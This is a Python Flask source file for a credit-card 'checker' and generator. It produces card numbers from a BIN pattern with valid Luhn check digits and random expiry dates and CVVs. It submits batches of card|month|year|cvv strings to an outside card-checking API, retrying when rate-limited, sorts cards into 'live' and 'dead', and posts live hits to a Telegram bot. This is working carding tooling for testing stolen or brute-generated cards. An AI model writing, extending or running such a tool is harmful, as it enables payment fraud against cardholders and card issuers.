import os
from datetime import datetime
from flask import Flask, render_template, request, jsonify
import requests
import json
import gzip
import time

app = Flask(__name__)


def send_live_notification(card_number, result):
    """Send a safe LIVE notification to Telegram."""
    token = os.getenv("AAGdzfxliPzq1DSfzFdfPjQutGH47uL-Z8A")
    chat_id = os.getenv("8893038124")

    if not token or not chat_id:
        print("Telegram credentials are missing")
        return

    digits = ''.join(filter(str.isdigit, str(card_number)))

    if len(digits) >= 10:
        masked = f"{digits[:6]}******{digits[-4:]}"
    else:
        masked = "Masked"

    text = (
        "🔴 LIVE RESULT DETECTED\n\n"
        f"Card: {masked}\n"
        f"Bank: {result.get('bank', 'Unknown')}\n"
        f"Brand: {result.get('brand', 'Unknown')}\n"
        f"Type: {result.get('type', 'Unknown')}\n"
        f"Country: {result.get('country', 'Unknown')}\n"
        f"Message: {result.get('message', 'No message')}\n"
        f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )

    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"

        response = requests.post(
            url,
            json={
                "chat_id": chat_id,
                "text": text
            },
            timeout=10
        )

        response.raise_for_status()
        print("Telegram notification sent")

    except Exception as e:
        print(f"Telegram notification error: {e}")


def check_card(card_data):
    """Check a single card using the chkr.cc API"""

    url = "https://api.chkr.cc/"

    headers = {
        "Host": "api.chkr.cc",
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
        "Content-Type": "application/json; charset=utf-8",
        "Origin": "https://chkr.cc",
        "Referer": "https://chkr.cc/"
    }

    data = {
        "data": (
            f"{card_data['card']}|"
            f"{card_data['month']}|"
            f"{card_data['year']}|"
            f"{card_data['cvv']}"
        ),
        "charge": False
    }

    max_retries = 3

    for attempt in range(max_retries):

        try:
            response = requests.post(
                url,
                headers=headers,
                json=data,
                timeout=15
            )

            if response.status_code == 429:
                wait_time = (2 ** attempt) * 5
                time.sleep(wait_time)
                continue

            response.raise_for_status()

            content = response.content

            try:
                if response.headers.get("content-encoding") == "gzip":
                    content = gzip.decompress(content)

                result = json.loads(content.decode("utf-8"))

            except Exception:

                try:
                    result = response.json()

                except json.JSONDecodeError:
                    raise Exception(
                        f"Invalid JSON response: {response.text[:100]}"
                    )

            return {
                "card": card_data.get("full", "Masked"),
                "status": determine_status(result),
                "bank": result.get("card", {}).get("bank", "Unknown"),
                "type": result.get("card", {}).get("type", "Unknown"),
                "category": result.get("card", {}).get(
                    "category",
                    "Unknown"
                ),
                "brand": result.get("card", {}).get(
                    "brand",
                    "Unknown"
                ),
                "country": result.get(
                    "card",
                    {}
                ).get(
                    "country",
                    {}
                ).get(
                    "name",
                    "Unknown"
                ),
                "message": result.get("message", "No message")
            }

        except requests.exceptions.RequestException as e:

            if attempt == max_retries - 1:
                raise Exception(f"Request failed: {str(e)}")

            time.sleep(2)

    raise Exception("Max retries exceeded")


def determine_status(result):
    """Determine card status from API response."""

    status = result.get("status", "").lower()

    if status in ["die", "dead", "declined", "failed"]:
        return "dead"

    elif status in [
        "live",
        "approved",
        "charged",
        "ccn",
        "success"
    ]:
        return "live"

    else:
        return "unknown"


@app.route("/")
def index():
    """Serve the main HTML page."""

    return render_template("index.html")


@app.route("/test", methods=["GET"])
def test():
    """Test endpoint."""

    return jsonify({
        "status": "Server is working",
        "time": time.time()
    })


@app.route("/check", methods=["POST"])
def check_cards():
    """Check multiple entries."""

    try:

        data = request.json or {}
        cards = data.get("cards", [])

        if not cards:
            return jsonify({
                "error": "No cards provided"
            }), 400

        results = []

        for card_data in cards:

            try:

                result = check_card(card_data)

                # Send Telegram notification only for LIVE results
                if result["status"] == "live":
                    send_live_notification(
                        card_data.get("card", ""),
                        result
                    )

                results.append(result)


            except Exception as e:

                results.append({
                    "card": "Masked",
                    "status": "unknown",
                    "error": str(e)
                })

        return jsonify({
            "results": results
        })

    except Exception as e:

        import traceback

        print(f"Server error: {str(e)}")
        print(traceback.format_exc())

        return jsonify({
            "error": str(e)
        }), 500


@app.route("/check_single", methods=["POST"])
def check_single_card():
    """Check a single entry."""

    try:

        card_data = request.json or {}

        result = check_card(card_data)

        print(f"Result status: {result['status']}")

        # Telegram notification for LIVE result
        if result["status"] == "live":
            send_live_notification(
                card_data.get("card", ""),
                result
            )

        return jsonify(result)

    except Exception as e:

        import traceback

        print(f"Error: {str(e)}")
        print(traceback.format_exc())

        return jsonify({
            "error": str(e)
        }), 500


@app.route("/generate", methods=["POST"])
def generate_cards():

    try:

        data = request.json or {}

        bin_input = data.get("bin", "")
        quantity = data.get("quantity", 10)
        month = data.get("month", "")
        year = data.get("year", "")
        cvv = data.get("cvv", "")
        card_length = data.get("card_length", 16)

        if (
            not bin_input
            or len(
                bin_input.replace("X", "").replace("x", "")
            ) < 6
        ):
            return jsonify({
                "error": "Invalid BIN"
            }), 400

        quantity = int(quantity)

        if quantity < 1 or quantity > 999:
            return jsonify({
                "error": "Quantity must be between 1 and 999"
            }), 400

        card_length = int(card_length)

        if card_length not in [13, 15, 16]:
            return jsonify({
                "error": "Invalid card length"
            }), 400

        generated_cards = []

        for _ in range(quantity):

            card = generate_single_card(
                bin_input,
                month,
                year,
                cvv,
                card_length
            )

            generated_cards.append(card)

        return jsonify({
            "cards": generated_cards
        })

    except Exception as e:

        return jsonify({
            "error": f"Generation error: {str(e)}"
        }), 500


def generate_single_card(
    bin_input,
    month,
    year,
    cvv,
    card_length=16
):

    import random

    bin_pattern = bin_input.upper()

    random_digits = []

    for char in bin_pattern:

        if char == "X":
            random_digits.append(
                str(random.randint(0, 9))
            )

        else:
            random_digits.append(char)

    base_card = "".join(random_digits)

    if len(base_card) < card_length - 1:

        additional = (
            card_length - 1
        ) - len(base_card)

        base_card += "".join(
            str(random.randint(0, 9))
            for _ in range(additional)
        )

    elif len(base_card) > card_length - 1:

        base_card = base_card[:card_length - 1]

    check_digit = calculate_luhn_check_digit(
        base_card
    )

    full_card_number = (
        base_card + str(check_digit)
    )

    if not month:
        month = str(
            random.randint(1, 12)
        ).zfill(2)

    if not year:
        year = str(
            random.randint(2026, 2030)
        )

    if not cvv:
        cvv = str(
            random.randint(100, 999)
        )

    if len(year) == 2:
        year = "20" + year

    return (
        f"{full_card_number}|"
        f"{month}|"
        f"{year}|"
        f"{cvv}"
    )


def calculate_luhn_check_digit(card_number):

    total = 0

    reverse_digits = card_number[::-1]

    for i, digit in enumerate(reverse_digits):

        n = int(digit)

        if i % 2 == 0:

            n *= 2

            if n > 9:
                n -= 9

        total += n

    return (
        10 - (total % 10)
    ) % 10


if __name__ == "__main__":
    app.run(
        debug=True,
        host="0.0.0.0",
        port=5000
    )